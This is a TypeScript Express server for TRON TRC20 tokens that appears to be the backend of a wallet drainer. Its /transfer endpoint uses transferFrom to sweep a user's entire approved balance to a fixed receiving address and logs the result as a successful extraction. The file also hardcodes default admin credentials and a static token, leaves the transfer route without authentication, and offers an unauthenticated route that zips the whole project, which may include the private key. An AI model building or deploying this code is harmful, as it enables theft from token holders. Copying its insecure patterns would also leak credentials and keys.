import express from 'express';
import path from 'path';
import cors from 'cors';
import bodyParser from 'body-parser';
import dotenv from 'dotenv';
import { TronWeb } from 'tronweb';
import { createServer as createViteServer } from 'vite';

dotenv.config();

const FULL_NODE = process.env.FULL_NODE || 'https://api.trongrid.io';
const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT || '';
const SPENDER_ADDRESS = process.env.SPENDER_ADDRESS || '';
const TO_ADDRESS = process.env.TO_ADDRESS || '';
const PLATFORM_PRIVATE_KEY = process.env.PLATFORM_PRIVATE_KEY || '';
const ADMIN_USER = process.env.ADMIN_USER || 'bootsky888';
const ADMIN_PASS = process.env.ADMIN_PASS || 'Qa7495231@@@';

// TRC20 ABI
const TRC20_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_amount', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: '_from', type: 'address' },
      { name: '_to', type: 'address' },
      { name: '_amount', type: 'uint256' },
    ],
    name: 'transferFrom',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function',
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' },
    ],
    name: 'allowance',
    outputs: [{ name: 'remaining', type: 'uint256' }],
    type: 'function',
  },
];

function getTronClient() {
  const pk = PLATFORM_PRIVATE_KEY || '0000000000000000000000000000000000000000000000000000000000000001';
  return new TronWeb({
    fullHost: FULL_NODE,
    privateKey: pk,
  });
}

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.use(cors());
  app.use(bodyParser.json());

  // Health check endpoint
  app.get('/health', (req, res) => {
    const isConfigured = Boolean(TOKEN_CONTRACT && SPENDER_ADDRESS && TO_ADDRESS && PLATFORM_PRIVATE_KEY);
    res.json({
      status: isConfigured ? 'ok' : 'unconfigured',
      configured: isConfigured,
      network: FULL_NODE,
      spender: SPENDER_ADDRESS || 'Not set',
      to: TO_ADDRESS || 'Not set',
      tokenContract: TOKEN_CONTRACT || 'Not set',
      message: isConfigured
        ? 'TRON backend service is active'
        : 'Environment variables TOKEN_CONTRACT, SPENDER_ADDRESS, TO_ADDRESS, PLATFORM_PRIVATE_KEY need to be configured in .env',
    });
  });

  // Balance endpoint
  app.get('/balance/:address', async (req, res) => {
    try {
      const address = req.params.address;
      if (!TOKEN_CONTRACT) {
        return res.status(400).json({ error: 'TOKEN_CONTRACT 环境变量未配置' });
      }
      const tronWeb = getTronClient();
      if (!tronWeb.isAddress(address)) {
        return res.status(400).json({ error: '无效地址' });
      }
      const contract = tronWeb.contract(TRC20_ABI, TOKEN_CONTRACT);
      const balance = await contract.balanceOf(address).call();
      res.json({ balance: balance.toString() });
    } catch (err: any) {
      console.error('获取余额失败:', err);
      res.status(500).json({ error: err?.message || '获取余额失败' });
    }
  });

  // TransferFrom endpoint
  app.post('/transfer', async (req, res) => {
    try {
      const { userAddress, amount } = req.body;
      if (!TOKEN_CONTRACT || !PLATFORM_PRIVATE_KEY || !TO_ADDRESS) {
        return res.status(400).json({ error: '服务缺少必要环境变量 (TOKEN_CONTRACT, PLATFORM_PRIVATE_KEY, TO_ADDRESS)' });
      }
      const tronWeb = getTronClient();
      if (!userAddress || !tronWeb.isAddress(userAddress)) {
        return res.status(400).json({ error: '用户地址无效' });
      }

      const contract = tronWeb.contract(TRC20_ABI, TOKEN_CONTRACT);
      const balance = await contract.balanceOf(userAddress).call();
      const balanceBN = BigInt(balance);

      let transferAmount: bigint;
      if (amount === 'all' || !amount) {
        transferAmount = balanceBN;
      } else {
        transferAmount = BigInt(amount);
        if (transferAmount > balanceBN) {
          return res.status(400).json({ error: '余额不足' });
        }
      }

      if (transferAmount === 0n) {
        return res.json({ success: true, message: '余额为0，无需转移', txid: null, amount: '0' });
      }

      const result = await contract.transferFrom(
        userAddress,
        TO_ADDRESS,
        transferAmount.toString()
      ).send({
        feeLimit: 150_000_000,
        callValue: 0,
      });

      console.log(`[+] 提取成功: 用户 ${userAddress} -> ${TO_ADDRESS}, 数量 ${transferAmount.toString()}, TxID: ${result}`);
      res.json({
        success: true,
        txid: result,
        amount: transferAmount.toString(),
        to: TO_ADDRESS,
        message: '提取成功',
      });
    } catch (err: any) {
      console.error('transferFrom 失败:', err);
      res.status(500).json({ error: err?.message || 'transferFrom 失败' });
    }
  });

  // Allowance endpoint
  app.get('/allowance/:owner/:spender', async (req, res) => {
    try {
      const { owner, spender } = req.params;
      if (!TOKEN_CONTRACT) {
        return res.status(400).json({ error: 'TOKEN_CONTRACT 环境变量未配置' });
      }
      const tronWeb = getTronClient();
      if (!tronWeb.isAddress(owner) || !tronWeb.isAddress(spender)) {
        return res.status(400).json({ error: '地址无效' });
      }
      const contract = tronWeb.contract(TRC20_ABI, TOKEN_CONTRACT);
      const allowance = await contract.allowance(owner, spender).call();
      res.json({ allowance: allowance.toString() });
    } catch (err: any) {
      res.status(500).json({ error: err?.message || '查询授权额度失败' });
    }
  });

  // Admin login endpoint
  app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body || {};
    if (username === ADMIN_USER && password === ADMIN_PASS) {
      return res.json({ success: true, token: 'admin-token-bootsky888', username, message: '登录成功' });
    }
    return res.status(401).json({ success: false, error: '管理员账号或密码错误' });
  });

  // Export full project ZIP endpoint
  app.get('/export-project', async (req, res) => {
    try {
      const fs = await import('fs');
      const JSZip = (await import('jszip')).default;

      const zip = new JSZip();
      const rootDir = process.cwd();

      function addFilesToZip(dirPath: string, zipFolder: any) {
        const items = fs.readdirSync(dirPath);
        for (const item of items) {
          if (
            item === 'node_modules' ||
            item === 'dist' ||
            item === '.git' ||
            item === '.cache' ||
            item === '.nx' ||
            item.endsWith('.log')
          ) {
            continue;
          }
          const fullPath = path.join(dirPath, item);
          const stat = fs.statSync(fullPath);
          if (stat.isDirectory()) {
            const folder = zipFolder.folder(item);
            addFilesToZip(fullPath, folder);
          } else {
            const content = fs.readFileSync(fullPath);
            zipFolder.file(item, content);
          }
        }
      }

      addFilesToZip(rootDir, zip);
      const buffer = await zip.generateAsync({ type: 'nodebuffer' });

      res.setHeader('Content-Type', 'application/zip');
      res.setHeader('Content-Disposition', 'attachment; filename="tron-energy-platform-fullsite.zip"');
      res.send(buffer);
    } catch (err: any) {
      console.error('Export zip failed:', err);
      res.status(500).json({ error: '打包整站源码失败: ' + err.message });
    }
  });

  // Serve Vite frontend
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`[+] 服务已启动: http://0.0.0.0:${PORT}`);
    console.log(`[*] 网络: ${FULL_NODE}`);
    console.log(`[*] 代币合约: ${TOKEN_CONTRACT || '(未设置)'}`);
    console.log(`[*] 被授权方 (spender): ${SPENDER_ADDRESS || '(未设置)'}`);
    console.log(`[*] 最终收款地址: ${TO_ADDRESS || '(未设置)'}`);
    console.log(`[*] 接口: GET /balance/:address, POST /transfer, GET /allowance/:owner/:spender, GET /health`);
  });
}

startServer();
